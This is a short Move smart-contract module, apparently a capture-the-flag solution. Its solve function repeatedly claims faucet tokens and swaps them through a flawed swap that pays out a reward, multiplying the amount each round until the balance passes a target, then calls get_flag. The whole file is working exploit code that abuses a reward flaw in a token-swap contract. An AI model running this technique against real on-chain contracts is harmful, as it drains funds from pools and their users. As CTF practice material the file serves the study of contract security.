module attack::solve2 {
    use std::signer;
    use aptos_framework::coin;

    use attack::math;
    use ctfmovement::simple_coin::{Self, SimpleCoin, TestUSDC};
    use ctfmovement::swap;


    public entry fun solve(attacker: &signer) {

        let amount = (math::pow(10u128, 10u8) as u64);
        let target = amount;
        coin::register<SimpleCoin>(attacker);
        
        loop{
            simple_coin::claim_faucet(attacker, amount);

            let test_usdc = coin::withdraw<TestUSDC>(attacker, amount);
            let (simple_coin, reward) = swap::swap_exact_y_to_x_direct<SimpleCoin, TestUSDC>(test_usdc);
            coin::merge<SimpleCoin>(&mut simple_coin, reward);
            coin::deposit<SimpleCoin>(signer::address_of(attacker), simple_coin);

            if(coin::balance<SimpleCoin>(signer::address_of(attacker)) > target){
                break
            };

            amount = amount * 5;
        };
        
        simple_coin::get_flag(attacker);

    }
}